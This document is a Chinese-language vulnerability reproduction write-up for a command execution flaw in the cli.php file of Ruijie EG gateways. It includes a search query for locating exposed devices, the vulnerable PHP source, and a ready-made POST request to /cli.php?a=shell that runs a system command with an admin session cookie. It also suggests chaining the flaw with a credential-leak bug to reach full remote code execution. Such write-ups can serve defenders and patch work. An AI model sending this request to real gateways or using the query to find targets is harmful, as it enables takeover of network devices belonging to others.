# 锐捷 EG易网关 cli.php 远程命令执行漏洞

## 漏洞描述

锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器

## 漏洞影响

<a-checkbox checked>锐捷EG易网关</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Ruijie-EG易网关"</a-checkbox></br>

## 漏洞复现

首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)

漏洞文件 cli.php



```php
<?php

/**
 * cli命令查询
 */
define('IN', true);     //定位该文件是入口文件
define('DS', DIRECTORY_SEPARATOR);
define('AROOT', dirname(__FILE__) . DS);
include_once(AROOT . 'mvc' . DS . 'controller' . DS . 'core.controller.php');

class defaultController extends coreController {

    function __construct() {
// 载入默认的
        parent::__construct();
    }

    /**
     * cli命令执行
     */
    public function indexAction() {
        $mode = p("mode_url");
        $command = p("command");
        $answer = p("answer");

        if ($mode == false)
            $mode = "exec";
        if ($answer == false)
            $answer = "";
        if ($command !== false)
            $command = iconv('UTF-8', 'GBK//IGNORE', $command);
        $data = execCli($mode, $command, $answer);
        if ($data["status"] !== 1) {
            json_echo($data);
            exit();
        }
        $res = preg_replace(array("/%01/", "/%22/", "/%09/", "/%0D/", "/%3A/","/%07/"), array("", '"', "\t", "", ":",""), urlencode($data["data"])); //先进行url编码防止gbk中文无法json,再过滤首尾空方块
        $resArr = explode("%0A", $res);
        //$resArr = preg_split("/\r\n|\n/", $data["data"]);
        if ($mode == "config" && strstr($resArr[0], "Enter+configuration+commands%2C+one+per+line.++End+with+CNTL%2FZ."))
            array_shift($resArr);
        $data["data"] = $resArr;
        if (!headers_sent()) {
            header("Content-type: text/json;charset=gbk");
            //header("Expires: Thu, 01 Jan 1970 00:00:01 GMT");
            header("Cache-Control: no-cache, must-revalidate");
            header("Pragma: no-cache");
        }
        echo urldecode(json_encode($data));
        //echo json_encode($data);
    }

    /**
     * 执行shell脚本
     */
    public function shellAction() {
        $command = p("command");
        if ($command == false) {
            $data["status"] = 2;
            $data["msg"] = "no command";
            json_echo($data);
            exit();
        }
        $content = [];
        exec(EscapeShellCmd($command), $content);
        $data = array("status" => true,
            "data" => $content);
        json_echo($data);
    }

    /**
     * 获取系统时间
     */
    public function dateAction() {
        setTimeZone();
        $data['status'] = true;
        $data["data"]["time"] = date("Y-m-d H:i:s");
        $data["data"]["zone"] = "UTC" . getTimeZone();
        json_echo($data);
    }

    /**
     * 获取系统时区
     */
    public function datezoneAction() {
        $data['status'] = true;
        $data["data"] = getTimeZone();
        json_echo($data);
    }

    /**
     * 检测静态页面时候未登录直接进入
     */
    public function checkloginAction() {
        json_echo(array("status" => true));
    }

}

include_once(AROOT . "init.php");     //mvc初始化入口，放在底部
```



关键部分代码为



```php
/**
     * 执行shell脚本
     */
    public function shellAction() {
        $command = p("command");
        if ($command == false) {
            $data["status"] = 2;
            $data["msg"] = "no command";
            json_echo($data);
            exit();
        }
        $content = [];
        exec(EscapeShellCmd($command), $content);
        $data = array("status" => true,
            "data" => $content);
        json_echo($data);
    }
```



command参数直接传入执行了命令



发送请求包



```plain
POST /cli.php?a=shell HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

notdelay=true&command=id
```



![img](../../../.vuepress/public/img/ruijie-28.png)



## 